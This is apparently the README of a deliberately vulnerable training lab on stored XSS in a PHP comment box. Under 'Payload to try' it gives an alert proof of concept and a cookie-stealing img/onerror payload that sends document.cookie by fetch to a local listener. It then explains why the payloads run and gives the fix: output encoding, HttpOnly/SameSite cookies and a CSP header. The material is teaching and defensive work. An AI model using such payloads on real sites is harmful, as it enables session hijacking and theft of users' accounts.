# 02: Cross-Site Scripting (XSS)

Deliberately vulnerable comment box. Do not deploy it anywhere public.

## What is broken

`vulnerable.php` stores comments in the database and echoes them back with no encoding.
Any HTML or JavaScript typed into the comment box runs in every visitor's browser, not
just the poster's, because the payload is stored and served to everyone who loads the page.

## Payload to try

Proof of concept:

```
<script>alert(document.domain)</script>
```

Cookie theft, aimed at a local listener:

```
<img src=x onerror="fetch('http://localhost:9000/?c='+document.cookie)">
```

Catch it with:

```
python3 -m http.server 9000
```

Post the payload, then watch the request land in that terminal.

## Why it works

The browser cannot tell stored markup from the page's own markup. Whatever is between
`<div>` and `</div>` in the response is parsed as HTML, so a `<script>` tag executes and
an `<img>` tag with a bad `src` fires its `onerror` handler. Because the comment is
stored in the database, this is stored XSS: every later visitor triggers it, not just
the person who posted it.

## The fix

See `secure.php` line 35: output is passed through
`htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8')` before being echoed, so angle
brackets and quotes become harmless text instead of markup. Lines 3 and 5 add defence
in depth: `HttpOnly` + `SameSite=Lax` session cookies so a successful injection still
cannot read the cookie via `document.cookie`, and a
`Content-Security-Policy: default-src 'self'` header that blocks inline script execution
even if encoding is ever missed somewhere.
